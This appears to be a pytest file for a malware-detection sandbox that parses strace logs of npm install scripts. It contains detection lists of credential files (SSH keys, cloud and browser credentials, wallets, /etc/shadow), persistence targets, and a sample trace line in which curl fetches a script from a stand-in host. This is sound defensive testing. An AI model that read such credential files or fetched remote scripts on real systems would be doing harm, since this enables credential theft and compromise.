"""Reading the strace log back: what counts as evidence, and what must not."""
from __future__ import annotations

from pathlib import Path

import pytest

from malwhunter.chamber import runner
from malwhunter.chamber.trace import TRACE_FILE, UNAVAILABLE_MARKER, WRAPPER, parse_trace

HEAD = '1  execve("/usr/bin/sh", ["sh", "-c", "node setup.js"], 0x7ffd /* 5 vars */) = 0\n'


def trace_of(tmp_path: Path, *lines: str):
    (tmp_path / TRACE_FILE).write_text(HEAD + "".join(f"{ln}\n" for ln in lines))
    return parse_trace("pkg", tmp_path, proxy_port=8080)


def categories(trace):
    return sorted((s.category, s.severity.value) for s in trace.signals)


@pytest.mark.parametrize(
    "path",
    [
        "/home/node/.ssh/id_rsa", "/tmp/.aws/credentials", "/root/.docker/config.json", "/home/node/.kube/config",
        "/home/node/.config/gcloud/credentials.db", "/home/node/.git-credentials", "/home/node/.netrc",
        "/etc/shadow", "/home/node/.config/google-chrome/Default/Login Data", "/home/node/.ethereum/keystore/key",
        "/home/node/.config/gh/hosts.yml", "/home/node/.pypirc",
    ],
)
def test_opening_a_credential_store_is_high(tmp_path, path):
    t = trace_of(tmp_path, f'7  openat(AT_FDCWD, "{path}", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)')
    assert categories(t) == [("sensitive-file-access", "high")]
    assert path in t.files_of_interest[0]


@pytest.mark.parametrize(
    "path",
    ["/usr/lib/node_modules/npm/package.json", "/tmp/.npmrc", "/etc/passwd", "/etc/resolv.conf", "/pkg/index.js",
     "/proc/self/environ", "/tmp/build/.ssh-keygen-notes.txt"],
)
def test_ordinary_file_access_is_not_flagged(tmp_path, path):
    assert trace_of(tmp_path, f'7  openat(AT_FDCWD, "{path}", O_RDONLY|O_CLOEXEC) = 3').signals == []


def test_reading_another_process_environment_is_medium(tmp_path):
    t = trace_of(tmp_path, '7  openat(AT_FDCWD, "/proc/1/environ", O_RDONLY) = 3')
    assert categories(t) == [("sensitive-file-access", "medium")]


@pytest.mark.parametrize("path", ["/home/node/.bashrc", "/home/node/.ssh/authorized_keys", "/etc/cron.d/x", "/home/node/.zshrc"])
def test_writing_a_startup_or_access_file_is_persistence(tmp_path, path):
    t = trace_of(tmp_path, f'7  openat(AT_FDCWD, "{path}", O_WRONLY|O_CREAT|O_APPEND, 0644) = 3')
    assert categories(t) == [("persistence-attempt", "high")]


def test_merely_reading_bashrc_is_not_persistence(tmp_path):
    assert trace_of(tmp_path, '7  openat(AT_FDCWD, "/home/node/.bashrc", O_RDONLY) = 3').signals == []


def test_connection_that_bypasses_the_proxy_is_recorded(tmp_path):
    t = trace_of(tmp_path, '9  connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = -1 ENETUNREACH')
    assert categories(t) == [("proxy-bypass-attempt", "medium")] and t.direct_connects == ["93.184.216.34:443"]


def test_ipv6_connection_attempt_is_parsed(tmp_path):
    t = trace_of(tmp_path, '9  connect(3, {sa_family=AF_INET6, sin6_port=htons(443), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "2606:4700::1111", &sin6_addr), sin6_scope_id=0}, 28) = -1 ENETUNREACH')
    assert t.direct_connects == ["2606:4700::1111:443"]


def test_unfinished_connect_line_is_still_read(tmp_path):
    t = trace_of(tmp_path, '9  connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("1.2.3.4")}, 16 <unfinished ...>')
    assert t.direct_connects == ["1.2.3.4:80"]


@pytest.mark.parametrize(
    "line",
    [
        '9  connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("172.20.0.2")}, 16) = 0',  # the proxy
        '9  connect(3, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, 16) = 0',  # docker DNS
        '9  connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT',
    ],
)
def test_the_proxy_dns_and_harmless_sockets_are_not_flagged(tmp_path, line):
    assert trace_of(tmp_path, line).signals == []


def test_a_public_address_on_the_proxy_port_is_still_a_bypass(tmp_path):
    t = trace_of(tmp_path, '9  connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("8.8.8.8")}, 16) = -1 ENETUNREACH')
    assert t.direct_connects == ["8.8.8.8:8080"]


def test_container_runtime_socket_is_high(tmp_path):
    t = trace_of(tmp_path, '9  connect(3, {sa_family=AF_UNIX, sun_path="/var/run/docker.sock"}, 110) = -1 ENOENT')
    assert categories(t) == [("sensitive-file-access", "high")]


def test_processes_started_are_listed_in_order_without_duplicates(tmp_path):
    t = trace_of(
        tmp_path,
        '2  execve("/usr/bin/curl", ["curl", "-s", "http://x.test/p.sh"], 0x0) = 0',
        '3  execve("/usr/bin/sh", ["sh"], 0x0) = 0',
        '4  execve("/usr/bin/curl", ["curl", "-s", "http://x.test/p.sh"], 0x0) = 0',
    )
    assert t.processes == ["/usr/bin/sh: sh -c node setup.js", "/usr/bin/curl: curl -s http://x.test/p.sh", "/usr/bin/sh: sh"]


def test_each_finding_is_reported_once_however_often_it_happens(tmp_path):
    line = '7  openat(AT_FDCWD, "/home/node/.ssh/id_rsa", O_RDONLY) = -1 ENOENT'
    assert len(trace_of(tmp_path, line, line, line).signals) == 1


def test_deleted_or_empty_trace_is_reported_not_read_as_clean(tmp_path):
    t = parse_trace("pkg", tmp_path, proxy_port=8080)  # no log at all
    assert t.interference and categories(t) == [("trace-interference", "medium")]
    (tmp_path / TRACE_FILE).write_text("")
    assert parse_trace("pkg", tmp_path, proxy_port=8080).interference


def test_trace_unavailable_on_this_host_is_not_interference(tmp_path):
    (tmp_path / UNAVAILABLE_MARKER).write_text("")
    t = parse_trace("pkg", tmp_path, proxy_port=8080)
    assert not t.available and not t.interference and t.signals == []


def test_tracing_not_requested_means_nothing_is_expected(tmp_path):
    assert parse_trace("pkg", tmp_path, proxy_port=8080, tracing_expected=False).signals == []


def test_script_that_removes_its_own_trace_is_flagged(tmp_path):
    t = trace_of(tmp_path, '7  unlink("/trace/trace.log") = 0')
    assert categories(t) == [("trace-interference", "medium")]


def test_hostile_text_in_paths_is_neutralised(tmp_path):
    t = trace_of(tmp_path, '7  openat(AT_FDCWD, "/home/node/.ssh/\\033[2Jid_rsa", O_RDONLY) = -1 ENOENT')
    assert t.signals and "\x1b" not in t.signals[0].evidence[0].excerpt


def test_huge_log_is_read_with_a_cap(tmp_path, monkeypatch):
    from malwhunter.chamber import trace as trace_mod

    monkeypatch.setattr(trace_mod, "_MAX_TRACE_BYTES", 200)
    (tmp_path / TRACE_FILE).write_text(HEAD + ("7  openat(AT_FDCWD, \"/etc/hostname\", O_RDONLY) = 3\n" * 100000))
    assert parse_trace("pkg", tmp_path, proxy_port=8080).events < 10


# ---------- how the sandbox is started ----------

def _cmd(**kw):
    return runner._build_docker_command(
        Path("/s/pkg"), {"NPM_TOKEN": "canary_x"}, "node setup.js", network="n", container_name="c", **kw
    )


def test_untraced_command_is_unchanged():
    cmd = _cmd()
    assert cmd[-3:] == ["sh", "-c", "node setup.js"] and not any(a.startswith("MH_SCRIPT") for a in cmd)


def test_traced_command_runs_the_script_under_strace_via_the_wrapper():
    cmd = _cmd(trace_dir=Path("/s/trace"))
    assert cmd[-3:] == ["sh", "-c", WRAPPER] and "MH_SCRIPT=node setup.js" in cmd
    assert "/s/trace:/trace" in cmd and "strace" in WRAPPER and "-f" in WRAPPER


def test_package_mount_stays_the_first_volume_and_the_ca_is_read_only():
    cmd = _cmd(trace_dir=Path("/s/trace"), ca_path=Path("/s/capture/ca.pem"))
    assert cmd[cmd.index("-v") + 1] == "/s/pkg:/pkg"
    assert "/s/capture/ca.pem:/etc/malwhunter/ca.pem:ro" in cmd
    assert "NODE_EXTRA_CA_CERTS=/etc/malwhunter/ca.pem" in cmd and "NODE_USE_ENV_PROXY=1" in cmd


def test_no_ca_environment_without_interception():
    assert not any(a.startswith(("NODE_EXTRA_CA_CERTS", "SSL_CERT_FILE")) for a in _cmd())


def test_wrapper_probes_with_the_same_filter_before_relying_on_strace():
    from malwhunter.chamber.trace import SYSCALL_FILTER

    assert WRAPPER.count(f"-e trace={SYSCALL_FILTER}") == 2  # probe and real run use one filter
    assert UNAVAILABLE_MARKER in WRAPPER and WRAPPER.count("exec sh -c") == 1  # falls back to an untraced run


def test_tracing_summary_states_what_happened():
    assert runner._tracing_summary(None, False)["enabled"] is False
    assert "unavailable" in runner._tracing_summary(None, True)["note"]
    t = parse_trace("p", Path("/nonexistent"), proxy_port=8080)
    assert runner._tracing_summary(t, True)["interference"] is True
